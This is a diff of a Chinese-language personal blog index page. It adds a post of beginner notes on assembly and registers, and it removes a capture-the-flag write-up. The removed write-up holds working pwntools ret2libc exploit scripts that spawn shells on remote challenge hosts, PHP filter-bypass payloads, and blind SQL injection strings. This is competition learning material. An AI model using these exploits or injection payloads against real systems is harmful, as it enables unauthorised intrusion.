@@ -164,6 +164,107 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-二进制-汇编笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/01/19/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/">二进制/汇编笔记</a>
+    </h1>
+  
+
+        
+        
+
+
+<a href="/2022/01/19/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/" class="archive-article-date">
+  	<time datetime="2022-01-19T08:19:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-01-19</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>看课程可能是最简单的组成原理知识，可能对pwn帮助不大，权当复习吧</p>
+<p>加 INC -编译器-&gt; 0100 0000<br>减 DEC            0100 0100<br>乘 MUL            0100 1000 0100 1000<br>除 DIV             0100 1000 1100 1000</p>
+<p>想法：运用自己的进制写编译器，来进行从根源加密</p>
+<p>位运算加减乘除</p>
+<p>用或与非异或实现加法<br>1.异或运算（如果不考虑进位，异或可以直接出结果）<br>2.与运算（用于判断进位，若结果为0（即所有数都为0），则没有进位）<br>3.将与运算的结果左移一位<br>4.第三步的结果和第一步的结果异或<br>5.确认结果，将第四步的两个数与运算，判断是否有0（判断是否有进位）<br>（步骤：<br>1.A xor B -&gt; C<br>2.A and B -&gt; D<br>3.if(D==0) print(C)<br>else D&lt;&lt;(D左移一位)<br>4.C xor D -&gt; C<br>5.C and D -&gt; D<br>6.if(D==0) print(C)<br>else D&lt;&lt;(D左移一位)<br>……</p>
+<p>减法（转负数相加后走上面的步骤）</p>
+<p>乘除就是按照组原的补码移位那一套使用加法就好了</p>
+<p>汇编<br>1.最好从vc6开始学各种东西来了解底层<br>2.ollydbg</p>
+<p>通用寄存器：<br>32位的通用寄存器只有8个<br>EAX<br>ECX<br>EDX<br>EBX<br>ESP<br>EBP<br>ESI<br>EDI<br>存值范围0-FFFFFFFF</p>
+<p>16位：FFFF<br>AX<br>CX<br>DX<br>BX<br>SP<br>BP<br>SI<br>DI</p>
+<p>8位：FF<br>AL<br>CL<br>DL<br>BL<br>AH<br>CH<br>DH<br>BH<br>8位：L低八位，H高八位</p>
+<p>指令：<br>MOV：<br>    mov 目的地址，立即数<br>    mov 目的地址，取数地址</p>
+<p>内存：<br>每个应用程序都有4GB的内存空间（可以理解为虚拟机的预设磁盘大小？虽然预设40G，但是虚拟机本身往往都没有40G）</p>
+<p>说是二进制，但是对于内存，寄存器还有汇编的知识都不是很具体（不过比我的组原老师讲的好太多了）</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/01/19/%E4%BA%8C%E8%BF%9B%E5%88%B6-%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
+      <div id="vcomment" class="comment"></div> 
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+   var notify = 'false' == true ? true : false;
+   var verify = 'false' == true ? true : false;
+    window.onload = function() {
+        new Valine({
+            el: '.comment',
+            notify: notify,
+            verify: verify,
+            app_id: "APP ID",
+            app_key: "APP KEY",
+            placeholder: "Just go go",
+            avatar:"retro"
+        });
+    }
+</script>
+
+    </section>
+  
+  
     <article id="post-JavaScript笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1142,141 +1243,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2022/01/10/Java%E7%AC%94%E8%AE%B0/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
-    <article id="post-鹤城杯" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/10/09/%E9%B9%A4%E5%9F%8E%E6%9D%AF/">鹤城杯</a>
-    </h1>
-  
-
-        
-        
-
-
-<a href="/2021/10/09/%E9%B9%A4%E5%9F%8E%E6%9D%AF/" class="archive-article-date">
-  	<time datetime="2021-10-09T03:21:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-09</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>第一次以团队形式参赛，全大二队伍拿到96名成绩还可以<br>贡献不大，全靠队友带飞</p>
-<p>babyof payload<br>基本的ropgadget<br>from pwn import *<br>from LibcSearcher import *</p>
-<p>#io = process(‘./babyof’)<br>io = remote(‘182.116.62.85’, 21613)<br>elf = ELF(‘./babyof’)<br>context.log_level = ‘debug’</p>
-<p>pop_rdi_ret = 0x400743<br>puts_plt = elf.plt[‘puts’]<br>puts_got = elf.got[‘puts’]<br>func_addr = 0x400632</p>
-<p>payload = b’a’*(0x40 + 8) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(func_addr)<br>io.recv()<br>io.sendline(payload)</p>
-<p>io.recvline()<br>x = io.recv()[0:6]<br>puts_addr = u64(x.ljust(8,b’\x00’))<br>print(hex(puts_addr))</p>
-<p>libc = LibcSearcher(‘puts’,puts_addr)<br>libc_base = puts_addr - libc.dump(‘puts’)<br>system_addr = libc_base + libc.dump(‘system’)<br>binsh_addr = libc_base + libc.dump(‘str_bin_sh’)</p>
-<p>ret = 0x400506<br>payload2 = b’a’*(0x40+8)<br>payload2 += p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</p>
-<p>io.sendline(payload2)<br>io.interactive()</p>
-<p>flag{89b55977-566c-431d-9034-74e7c181f340}</p>
-<p>littleof payload<br>多一个canary读取，和上题基本一样<br>from pwn import *<br>from LibcSearcher import *</p>
-<p>io = remote(‘182.116.62.85’, 27056)<br>#io = process(‘./littleof’)<br>elf = ELF(‘./littleof’)<br>context.log_level = ‘debug’</p>
-<p>pop_rdi_ret = 0x400863<br>puts_plt = elf.plt[‘puts’]<br>puts_got = elf.got[‘puts’]<br>func_addr = 0x4006e2</p>
-<p>payload1 = b’a’ * (0x50 - 8)<br>io.recv()<br>io.sendline(payload1)<br>io.recvuntil(payload1)<br>canary = u64(io.recv(8)) - 0xa<br>print(hex(canary))</p>
-<p>payload2 = payload1 + p64(canary) + p64(1) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(func_addr)<br>io.recv()<br>io.sendline(payload2)</p>
-<p>io.recvline()<br>x = io.recv()[0:6]<br>puts_addr = u64(x.ljust(8,b’\x00’))<br>print(hex(puts_addr))</p>
-<p>libc = LibcSearcher(‘puts’,puts_addr)<br>libc_base = puts_addr - libc.dump(‘puts’)<br>system_addr = libc_base + libc.dump(‘system’)<br>binsh_addr = libc_base + libc.dump(‘str_bin_sh’)</p>
-<p>io.sendline(b’1’)<br>io.recv()</p>
-<p>ret = 0x40059e<br>payload3 = payload1 + p64(canary) + p64(1) + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</p>
-<p>io.sendline(payload3)<br>io.interactive()</p>
-<p>flag{25e96197d4da10748a055753b5104856}</p>
-<p>easy_crytpo<br>签到题，联想到社会主义核心价值观编码，网上找到在线解码器<br>flag{IlUqU9O5guX6YiITsRNPiQmbhNRjGuTP}</p>
-<p>A_crytpo<br>根据flag长度分析得出可能是四位一组的分组编码，并且前二十位可能是<br>4O59：f<br>5954：l<br>494Q：a<br>3251：g<br>5046：{<br>md，我太菜了！</p>
-<p>WEB MIDDLE_MAGIC<br>level1绕过<br>$aaa = preg_replace(‘/^(.<em>)level(.</em>)$/‘, ‘${1}<!-- filtered -->${2}’, $_GET[‘aaa’]);<br>任意匹配不包括%0a,#需要url编码%23表示<br>aaa=%0apass_the_level_1%23<br>level2<br>sha1绕过，sha1不能对数组加密，返回值都是NULL<br>admin[]=1&amp;root_pwd=2<br>level3<br>json绕过<br>在json中0对应任意字符串<br>level_3 = {“result”:0}<br>flag{f03d41bf6c8d55f12324fd57f7a00427}</p>
-<p>NEW_MISC<br>下载下来是一个pdf文件<br>010打开，发现20/09 16进制对<br>怀疑pdf隐写，wbStego跑一下<br>flag{verY_g00d_YoU_f0und_th1s}</p>
-<p>MISC2<br>下载了一副图片<br>经检查，无隐写，无crc修改<br>放入stegsolve，点点点<br>发现有lsb，将字符串提取出来，发现是NCR转义，将其化为ascii，得<br>flag{h0w_4bouT_enc0de_4nd_pnG}</p>
-<p>easysql2</p>
-<p>xdm可以试试盲注<br>username error 和 passwd error</p>
-<p>数据库名ctf<br>用’and%0a(ascii(substr(version(),1,1))&gt;1)#爆一下版本号<br>版本号为8.0.4<br>使用最新的sql特性注入<br>admin’and/<strong>/(‘def’,’a’,3,4,5,6)&lt;=(table/</strong>/information_schema.TABLE_CONSTRAINTS/<strong>/limit/</strong>/317,1)#</p>
-<p>EASYP<br>题目：<br>&lt;?php<br>include ‘utils.php’;</p>
-<p>if (isset($_POST[‘guess’])) {<br>    $guess = (string) $_POST[‘guess’];<br>    if ($guess === $secret) {<br>        $message = ‘Congratulations! The flag is: ‘ . $flag;<br>    } else {<br>        $message = ‘Wrong. Try Again’;<br>    }<br>}</p>
-<p>if (preg_match(‘/utils.php/*$/i’, $_SERVER[‘PHP_SELF’])) {<br>    exit(“hacker :)”);<br>}</p>
-<p>if (preg_match(‘/show_source/‘, $_SERVER[‘REQUEST_URI’])){<br>    exit(“hacker :)”);<br>}</p>
-<p>if (isset($_GET[‘show_source’])) {<br>    highlight_file(basename($_SERVER[‘PHP_SELF’]));<br>    exit();<br>}else{<br>    show_source(<strong>FILE</strong>);<br>}<br>?&gt;</p>
-<p>脚本：<br>import requests</p>
-<p>for i in range(0,255):</p>
-<pre><code>j=hex(i)[2:]
-print(j)
-url = &#39;http://182.116.62.85:21895/index.php/utils.php/%&#39;+ j + &#39;?show%20source=1&#39;
-#http://182.116.62.85:21895/?show%20source=1
-r = requests.get(url)
-if &#39;flag&#123;&#39; in r.text:
-    print(r.text)
-    break
-</code></pre>
-<p>$_SERVER[‘REQUEST_URI’]会把特殊字符（如空格）转换成下划线<br>$secret需要爆破，所以有了j<br>basename() 函数返回路径中的文件名部分，$_SERVER[‘PHP_SELF’]返回当前执行脚本的文件名。<br>传入<a target="_blank" rel="noopener" href="http://182.116.62.85:21895/index.php/utils.php">http://182.116.62.85:21895/index.php/utils.php</a> 时，$_SERVER[‘PHP_SELF’]会返回index.php/utils.php，而basename()会返回utils.php。这样我们再加上?show%20source=1就可以让highlight_file显示utils.php，而flag就在里面。<br>flag{bsyxmK7ncU5nPjsGMckFo8kgq95qRasg}</p>
-<p>流量分析<br>手工分析<br>首先进行数据包筛选<br>发现是一道sql注入的数据包</p>
-<p>根据数据包回包中字符长度不一样的部分，取出其中的ascii码，转换成flag<br>1 102  f<br>2 108 l<br>3 97<br>4 103<br>5 123<br>6 119<br>7 49<br>8 114<br>9 101<br>10 115<br>11 104<br>12 65<br>13 82<br>14 75<br>15 95<br>16 101<br>17 122<br>18 95<br>19 49<br>20 115<br>21 110<br>22 116<br>23 105<br>24 116<br>25 125<br>26 33<br>flag{w1reshARK_ez_1sntit}</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/10/09/%E9%B9%A4%E5%9F%8E%E6%9D%AF/">展开全文 >></a>
         </p>
       
 
